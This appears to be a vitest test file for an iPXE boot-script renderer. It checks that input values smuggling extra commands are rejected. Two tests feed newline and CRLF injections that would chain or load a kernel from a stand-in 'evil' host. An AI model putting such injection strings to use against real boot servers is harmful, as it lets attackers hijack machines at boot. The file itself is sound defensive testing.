
import { join } from 'node:path';

import { describe, expect, it } from 'vitest';

import { resolveAssetsDir } from '../../core/application.config.js';
import { IpxeServiceError } from '../ipxe-errors.js';
import { IpxeTemplateRenderer, type ServerTokenAtomFetcher } from '../ipxe-renderer.service.js';
import type { IpxeConfig } from '../ipxe.config.js';

function realConfig(): IpxeConfig {
  return {
    bridgeUrl: 'https://bridge',
    environment: 'test',
    discoveryPlatformSlug: 'brokkr-discovery',
    finalBuildsDir: '/opt/brokkr/ipxe-builds',
    assetsDir: join(resolveAssetsDir({}), 'ipxe'),
  };
}

function tokenFetcher(
  endpoint = 'https://hub/api/v1/bmc/phone-home',
  token = 'live-token-hex',
): ServerTokenAtomFetcher {
  return async () => ({ brokkr_live_token: token, endpoint, exp: 1_730_000_000 });
}

describe('custom.ipxe.njk injection surface', () => {
  it('renders a single chain command for a safe ipxe_url', async () => {
    const renderer = new IpxeTemplateRenderer(realConfig(), tokenFetcher());
    const out = await renderer.render_custom({
      ipxe_url: 'https://hub/custom.ipxe',
      device_id: 'dev-1',
      job_id: 'job-1',
    });
    const chainLines = out.split('\n').filter((l) => l.startsWith('chain '));
    expect(chainLines).toEqual(['chain https://hub/custom.ipxe']);
  });

  it('refuses to render when ipxe_url carries a newline + injected chain command', async () => {
    const renderer = new IpxeTemplateRenderer(realConfig(), tokenFetcher());
    await expect(
      renderer.render_custom({
        ipxe_url: 'http://ok/x\nchain http://evil/boot.ipxe',
        device_id: 'dev-1',
        job_id: 'job-1',
      }),
    ).rejects.toThrow(IpxeServiceError);
  });

  it('refuses to render when the hub-minted phone_home_endpoint carries a control char', async () => {
    const renderer = new IpxeTemplateRenderer(
      realConfig(),
      tokenFetcher('https://hub/phone\r\nkernel http://evil/vmlinuz'),
    );
    await expect(
      renderer.render_custom({ ipxe_url: 'https://hub/custom.ipxe', device_id: 'dev-1', job_id: 'job-1' }),
    ).rejects.toThrow(IpxeServiceError);
  });
});
